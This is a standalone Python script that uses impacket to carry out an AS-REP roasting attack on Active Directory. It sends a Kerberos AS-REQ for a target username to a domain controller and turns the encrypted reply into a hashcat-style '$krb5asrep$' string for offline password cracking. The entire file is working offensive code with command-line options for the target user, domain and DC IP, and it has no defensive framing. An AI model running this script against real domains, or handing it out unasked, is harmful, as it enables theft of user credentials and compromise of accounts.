#!/usr/bin/env python3

import sys
import os
import datetime
import logging
from binascii import hexlify
from optparse import OptionParser
from impacket.krb5 import constants
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5.asn1 import AS_REQ, KDCOptions, seq_set, seq_set_iter, AS_REP
from impacket.krb5.kerberosv5 import sendReceive
from pyasn1.codec.der import encoder, decoder

def getASREP(username, domain, kdcHost):
    userPrincipal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    asReq = AS_REQ()

    asReq['pvno'] = 5
    asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

    reqBody = asReq['req-body']

    reqBody['kdc-options'] = KDCOptions('40810010')

    seq_set(reqBody, 'cname', userPrincipal.components_to_asn1)
    reqBody['realm'] = domain.upper()

    seq_set(reqBody, 'sname', Principal('krbtgt/%s' % domain.upper(), type=constants.PrincipalNameType.NT_SRV_INST.value).components_to_asn1)

    now = datetime.datetime.utcnow()
    reqBody['till'] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    reqBody['rtime'] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    reqBody['nonce'] = int(hexlify(os.urandom(4)), 16)

    reqBody['etype'] = [int(constants.EncryptionTypes.rc4_hmac.value),
                        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)]

    message = encoder.encode(asReq)

    response = sendReceive(message, domain, kdcHost)

    return response

def parseASREPHash(response, username, domain):
    asRep = decoder.decode(response, asn1Spec=AS_REP())[0]
    cipher = asRep['enc-part']['cipher'].asOctets()
    cipher_hex = hexlify(cipher).decode()

    encType = int(asRep['enc-part']['etype'])

    if encType == constants.EncryptionTypes.rc4_hmac.value:
        hash_str = '$krb5asrep$23$%s@%s:%s' % (username, domain.upper(), cipher_hex)
    elif encType == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
        hash_str = '$krb5asrep$18$%s@%s:%s' % (username, domain.upper(), cipher_hex)
    elif encType == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
        hash_str = '$krb5asrep$17$%s@%s:%s' % (username, domain.upper(), cipher_hex)
    else:
        logging.warning('Unsupported encryption type: %d' % encType)
        return None

    return hash_str

if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option('-u', '--user', help='Target username')
    parser.add_option('-d', '--domain', help='Domain name')
    parser.add_option('--dc-ip', help='Domain Controller IP')
    parser.add_option('-v', action='store_true', help='Verbose output')

    (options, args) = parser.parse_args()

    if not options.user or not options.domain or not options.dc_ip:
        parser.print_help()
        sys.exit(1)

    if options.v:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)

    username = options.user
    domain = options.domain
    dc_ip = options.dc_ip

    try:
        logging.info('Requesting AS-REP for user: %s' % username)
        response = getASREP(username, domain, dc_ip)

        hash_str = parseASREPHash(response, username, domain)
        if hash_str:
            print('\n[+] AS-REP Hash for user %s:' % username)
            print(hash_str)
        else:
            logging.error('Could not parse AS-REP into hash.')
    except Exception as e:
        logging.error('Error: %s' % str(e))
        sys.exit(1)
